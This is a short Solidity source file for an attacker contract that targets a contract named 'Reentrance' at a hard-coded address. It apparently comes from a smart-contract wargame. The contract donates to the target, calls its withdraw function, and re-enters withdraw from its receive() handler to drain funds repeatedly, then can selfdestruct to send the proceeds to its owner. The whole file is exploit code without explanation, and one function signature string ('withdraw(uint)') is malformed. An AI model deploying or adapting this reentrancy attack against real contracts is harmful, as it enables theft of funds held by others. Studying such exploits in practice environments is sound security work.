// SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;
interface Reentrance{
    function donate(address) external payable;
    function withdraw(uint) external;
}
contract hh {
address owner;
    constructor () public payable {
        owner = msg.sender;
    }
    Reentrance rr= Reentrance(0x14E4c94E546297B471f23EBFd97618a7983d2B9C);
    function callDonate(address _lapp, uint _much) public returns(string memory _nono){
        _nono="jwawi";
        (bool jj, bytes memory ll) = address(rr).call{value:_much}(abi.encodeWithSignature("donate(address)", _lapp));
        if(jj)
        _nono="yeeeeeeea";
    return _nono;
    }

function callParam(bytes memory _wa) public {
        address(rr).call(_wa);

    }

    function callWithdraw(uint _much) public {
        address(rr).call(abi.encodeWithSignature("withdraw(uint)", _much));

    }

    function withdraw(uint _much) public{
        rr.withdraw( _much);
        
    }

receive() external payable{
    //address(rr).call(abi.encodeWithSignature("withdraw(uint)", 1000000));
    rr.withdraw( 1);
}

fallback() external payable{
    //(bool jj, bytes memory ll) = address(rr).call(abi.encodeWithSignature("withdraw(uint)", 1000000));
}

    function murda() external{
        require(msg.sender==owner);
        selfdestruct(payable(owner));
    }
}